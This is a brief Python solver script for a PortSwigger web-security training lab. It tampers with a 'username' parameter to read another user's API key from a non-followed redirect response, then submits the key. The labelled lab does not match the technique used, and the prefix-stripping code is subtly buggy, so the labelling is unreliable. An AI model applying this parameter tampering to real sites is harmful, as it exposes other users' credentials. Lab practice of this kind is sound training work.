"""
https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented
"""

import sys
import requests
from bs4 import BeautifulSoup
import re

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

url = f'https://{site}/?username=carlos'
resp = s.get(url, allow_redirects=False)
soup = BeautifulSoup(resp.text,'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]

url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':api_key})